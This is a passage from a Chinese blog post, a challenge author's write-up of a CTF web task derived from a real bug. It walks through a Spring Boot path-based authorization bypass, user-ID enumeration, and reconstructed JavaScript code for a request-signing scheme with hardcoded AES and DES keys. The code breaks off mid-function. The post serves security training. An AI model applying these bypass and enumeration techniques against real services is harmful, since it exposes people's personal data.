@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="之前给移动大比武出的一道数据安全方向的web题，思路是之前挖的一个src的洞，差不多一比一的简化下来了，挺好玩的一个洞。不打比赛以后有段纯gap的时间，给各种各样的比赛出了好多次题，个人觉得出题一定要贴近实战，或者跟安全研究有联系，一定要让人学到东西不要有脑洞题，不然浪费别人时间是会被骂的。  解题思路题目名称：数据⽆价 2.0&#x20; 题⽬描述：请获取所有⼈的数据 考点：1.数据安全2.j">
+<meta property="og:type" content="article">
+<meta property="og:title" content="移动大比武某web题出题文档与wp—从实战出发">
+<meta property="og:url" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/index.html">
+<meta property="og:site_name" content="Bug@Life &amp;&amp; wa1ki0g">
+<meta property="og:description" content="之前给移动大比武出的一道数据安全方向的web题，思路是之前挖的一个src的洞，差不多一比一的简化下来了，挺好玩的一个洞。不打比赛以后有段纯gap的时间，给各种各样的比赛出了好多次题，个人觉得出题一定要贴近实战，或者跟安全研究有联系，一定要让人学到东西不要有脑洞题，不然浪费别人时间是会被骂的。  解题思路题目名称：数据⽆价 2.0&#x20; 题⽬描述：请获取所有⼈的数据 考点：1.数据安全2.j">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_R35bL7_7Y8.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_Em_vAsa2jl.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_M3aX8obNZr.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_JfQZ-sYt-J.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_Ot74jONid-.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_vRMY-vaBax.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_upSmDmF3S1.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_u-dah428jb.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_RilPJd5fyr.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_yQNo7oCQWx.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_rIP1I_E_jp.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_gLHAP2POEz.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_lAujD-udiw.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_U_vJIDlhh3.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_CMxO45C-jd.png">
+<meta property="og:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_0_73_VS2HP.png">
+<meta property="article:published_time" content="2025-03-19T17:07:18.000Z">
+<meta property="article:modified_time" content="2025-07-31T11:41:01.282Z">
+<meta property="article:author" content="wa1ki0g">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_R35bL7_7Y8.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>移动大比武某web题出题文档与wp—从实战出发</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/29/%E6%B3%9B%E5%BE%AEE-mobile%E6%9C%AA%E5%85%AC%E5%BC%80%E5%89%8D%E5%8F%B0rce%E4%B8%8E%E6%89%93%E7%82%B9bypass/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/20/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%80%92%E6%B0%AA40%E6%89%93%E7%A9%BF%E6%9F%90x%E5%86%85%E7%BD%91/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&text=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&is_video=false&description=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=移动大比武某web题出题文档与wp—从实战出发&body=Check out this article: http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&name=移动大比武某web题出题文档与wp—从实战出发&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&t=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.1.</span> <span class="toc-text">思路-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2-xA-x20"><span class="toc-number">1.2.</span> <span class="toc-text">思路-2
+      </span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        移动大比武某web题出题文档与wp—从实战出发
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wa1ki0g</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-19T17:07:18.000Z" class="dt-published" itemprop="datePublished">2025-03-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/red-team/">red-team</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>之前给移动大比武出的一道数据安全方向的web题，思路是之前挖的一个src的洞，差不多一比一的简化下来了，挺好玩的一个洞。不打比赛以后有段纯gap的时间，给各种各样的比赛出了好多次题，个人觉得出题一定要贴近实战，或者跟安全研究有联系，一定要让人学到东西不要有脑洞题，不然浪费别人时间是会被骂的。</p>
+</blockquote>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>题目名称：数据⽆价 2.0&#x20;</p>
+<p>题⽬描述：请获取所有⼈的数据</p>
+<p>考点：<br>1.数据安全<br>2.js 反混淆与动态调试<br>3.java 鉴权绕过<br>4.业务逻辑<br>5.nodejs</p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路-1"></a>思路-1</h3><p>访问 URL，默认为登录⻚⾯：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_R35bL7_7Y8.png"></p>
+<p>点击注册：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_Em_vAsa2jl.png"></p>
+<p>注册⽤户时发现，仅仅可注册普通⽤户，管理员⽤户不可注册，如图：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_M3aX8obNZr.png"></p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_JfQZ-sYt-J.png"></p>
+<p>尝试绕过&#x2F;admin&#x2F;register 路由鉴权，利⽤⾼低版本 spring-boot 对..&#x2F;的不同处理结合 java 的经典权限绕过<br>⽅式，进⾏绕过。使⽤<a target="_blank" rel="noopener" href="https://github.com/wa1ki0g/NoAuth" title="https:&#x2F;&#x2F;github.com&#x2F;wa1ki0g&#x2F;NoAuth">https://github.com/wa1ki0g/NoAuth</a> 进⾏ fuzz，⼿动测试也可</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_Ot74jONid-.png"></p>
+<p>发现多个 405 ⽅法，405 代表有权限只是没参数：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_vRMY-vaBax.png"></p>
+<p>随便选择⼀种⽅式进⾏绕过，成功绕过：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_upSmDmF3S1.png"></p>
+<p>登录后，提示要使⽤身份证进⾏查询，在管理员查询接⼝输⼊我们注册时使⽤的身份证号进⾏抓包：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_u-dah428jb.png"></p>
+<p>发现分别对&#x2F;getid&#x2F;15212220010521091，&#x2F;admin&#x2F;select 发送了请求，分析可发现，先是通<br>过&#x2F;getid&#x2F;$number 得到⽤户 id，再通过&#x2F;admin&#x2F;select 得到数据：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_RilPJd5fyr.png"></p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_yQNo7oCQWx.png"></p>
+<p>我们这⾥尝试遍历 id，来获取其他⽤户的数据，发现做了签名校验：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_rIP1I_E_jp.png"></p>
+<p>分析 js，全局搜索 sign 关键字发现⼀处可疑地点：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_gLHAP2POEz.png"></p>
+<p>对此函数设置断点，找⼀下⽤来加密的 js ⽂件：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_lAujD-udiw.png"></p>
+<p>跟进函数发现，是在 hook.js 中，同时发现 hook.js 的代码做了混淆：</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_U_vJIDlhh3.png"></p>
+<p>通过断点⼀点点的跟，代码很短，所以很容易就会发现算法为：base64+aes(key 为1234567890123456)+hex+des(key 为12345678’);</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_CMxO45C-jd.png"></p>
+<p>可以还原⼀下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generateSign</span>(<span class="params">id</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> base64Encoded = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(id));</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> aesKey = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&#x27;1234567890123456&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> aesEncrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(base64Encoded, aesKey, &#123;</span><br><span class="line">    <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">    <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">&#125;).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> hexEncoded = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">stringify</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">parse</span>(aesEncrypte</span><br><span class="line">d));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> desKey = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&#x27;12345678&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> desEncrypted = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">encrypt</span>(hexEncoded, desKey, &#123;</span><br><span class="line">    <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">    <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">&#125;).<span class="title function_">toString</span>();</span><br><span class="line">    